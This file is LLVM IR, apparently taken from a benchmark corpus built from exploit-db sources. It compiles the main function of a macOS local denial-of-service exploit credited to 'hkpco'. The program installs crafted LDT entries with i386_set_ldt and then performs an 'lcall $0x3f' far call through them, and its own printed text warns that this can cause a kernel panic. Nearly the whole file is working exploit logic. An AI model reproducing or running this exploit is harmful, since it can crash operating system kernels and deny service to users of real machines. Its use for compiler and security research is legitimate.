; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/osx/dos/extr_17901.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/osx/dos/extr_17901.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%union.ldt_entry = type { %struct.TYPE_4__ }
%struct.TYPE_4__ = type { i32, i32, i32, i32, i32, i64, %struct.TYPE_3__ }
%struct.TYPE_3__ = type { i32, i64, i64 }

@dummy_func = common dso_local global i64 0, align 8
@.str = private unnamed_addr constant [34 x i8] c"// coded by Chanam Park (hkpco)\0A\0A\00", align 1
@LDT_AUTO_ALLOC = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [34 x i8] c"Selector Number in LDT <1>: 0x%x\0A\00", align 1
@.str.2 = private unnamed_addr constant [35 x i8] c"Selector Number in LDT <2>: 0x%x\0A\0A\00", align 1
@.str.3 = private unnamed_addr constant [64 x i8] c"If you run this program, it can possibly cause \22Kernel Panic\22.\0A\00", align 1
@.str.4 = private unnamed_addr constant [57 x i8] c"The program will be continued when you input any value.\0A\00", align 1
@.str.5 = private unnamed_addr constant [4 x i8] c"-> \00", align 1
@stdout = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [3 x i8] c"%s\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %union.ldt_entry, align 8
  %4 = alloca %union.ldt_entry, align 8
  %5 = alloca [128 x i8], align 16
  store i32 0, i32* %1, align 4
  %6 = bitcast [128 x i8]* %5 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %6, i8 0, i64 128, i1 false)
  %7 = load i64, i64* @dummy_func, align 8
  %8 = trunc i64 %7 to i32
  %9 = and i32 %8, 65535
  %10 = bitcast %union.ldt_entry* %3 to %struct.TYPE_4__*
  %11 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %10, i32 0, i32 0
  store i32 %9, i32* %11, align 8
  %12 = load i64, i64* @dummy_func, align 8
  %13 = trunc i64 %12 to i32
  %14 = lshr i32 %13, 16
  %15 = and i32 %14, 65535
  %16 = bitcast %union.ldt_entry* %3 to %struct.TYPE_4__*
  %17 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %16, i32 0, i32 1
  store i32 %15, i32* %17, align 4
  %18 = bitcast %union.ldt_entry* %3 to %struct.TYPE_4__*
  %19 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %18, i32 0, i32 5
  store i64 0, i64* %19, align 8
  %20 = bitcast %union.ldt_entry* %3 to %struct.TYPE_4__*
  %21 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %20, i32 0, i32 2
  store i32 12, i32* %21, align 8
  %22 = bitcast %union.ldt_entry* %3 to %struct.TYPE_4__*
  %23 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %22, i32 0, i32 3
  store i32 3, i32* %23, align 4
  %24 = bitcast %union.ldt_entry* %3 to %struct.TYPE_4__*
  %25 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %24, i32 0, i32 4
  store i32 1, i32* %25, align 8
  %26 = bitcast %union.ldt_entry* %3 to %struct.TYPE_4__*
  %27 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %26, i32 0, i32 6
  %28 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %27, i32 0, i32 2
  store i64 0, i64* %28, align 8
  %29 = bitcast %union.ldt_entry* %3 to %struct.TYPE_4__*
  %30 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %29, i32 0, i32 6
  %31 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %30, i32 0, i32 1
  store i64 0, i64* %31, align 8
  %32 = bitcast %union.ldt_entry* %3 to %struct.TYPE_4__*
  %33 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %32, i32 0, i32 6
  %34 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %33, i32 0, i32 0
  store i32 16, i32* %34, align 8
  %35 = bitcast %union.ldt_entry* %4 to %struct.TYPE_4__*
  %36 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %35, i32 0, i32 0
  store i32 0, i32* %36, align 8
  %37 = bitcast %union.ldt_entry* %4 to %struct.TYPE_4__*
  %38 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %37, i32 0, i32 6
  %39 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %38, i32 0, i32 2
  store i64 0, i64* %39, align 8
  %40 = bitcast %union.ldt_entry* %4 to %struct.TYPE_4__*
  %41 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %40, i32 0, i32 6
  %42 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %41, i32 0, i32 1
  store i64 0, i64* %42, align 8
  %43 = bitcast %union.ldt_entry* %4 to %struct.TYPE_4__*
  %44 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %43, i32 0, i32 6
  %45 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %44, i32 0, i32 0
  store i32 0, i32* %45, align 8
  %46 = bitcast %union.ldt_entry* %4 to %struct.TYPE_4__*
  %47 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %46, i32 0, i32 5
  store i64 0, i64* %47, align 8
  %48 = bitcast %union.ldt_entry* %4 to %struct.TYPE_4__*
  %49 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %48, i32 0, i32 2
  store i32 0, i32* %49, align 8
  %50 = bitcast %union.ldt_entry* %4 to %struct.TYPE_4__*
  %51 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %50, i32 0, i32 3
  store i32 0, i32* %51, align 4
  %52 = bitcast %union.ldt_entry* %4 to %struct.TYPE_4__*
  %53 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %52, i32 0, i32 4
  store i32 1, i32* %53, align 8
  %54 = bitcast %union.ldt_entry* %4 to %struct.TYPE_4__*
  %55 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %54, i32 0, i32 1
  store i32 0, i32* %55, align 4
  %56 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str, i64 0, i64 0))
  %57 = load i32, i32* @LDT_AUTO_ALLOC, align 4
  %58 = call i32 @i386_set_ldt(i32 %57, %union.ldt_entry* %3, i32 1)
  store i32 %58, i32* %2, align 4
  %59 = load i32, i32* %2, align 4
  %60 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.1, i64 0, i64 0), i32 %59)
  %61 = load i32, i32* @LDT_AUTO_ALLOC, align 4
  %62 = call i32 @i386_set_ldt(i32 %61, %union.ldt_entry* %4, i32 1)
  store i32 %62, i32* %2, align 4
  %63 = load i32, i32* %2, align 4
  %64 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.2, i64 0, i64 0), i32 %63)
  %65 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.3, i64 0, i64 0))
  %66 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.4, i64 0, i64 0))
  %67 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.5, i64 0, i64 0))
  %68 = load i32, i32* @stdout, align 4
  %69 = call i32 @fflush(i32 %68)
  %70 = getelementptr inbounds [128 x i8], [128 x i8]* %5, i64 0, i64 0
  %71 = call i32 @scanf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.6, i64 0, i64 0), i8* %70)
  call void asm sideeffect "lcall $$0x3f, $$0x0", "~{dirflag},~{fpsr},~{flags}"() #3, !srcloc !2
  ret i32 0
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #1

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32 @i386_set_ldt(i32, %union.ldt_entry*, i32) #2

declare dso_local i32 @fflush(i32) #2

declare dso_local i32 @scanf(i8*, i8*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
!2 = !{i32 1842}
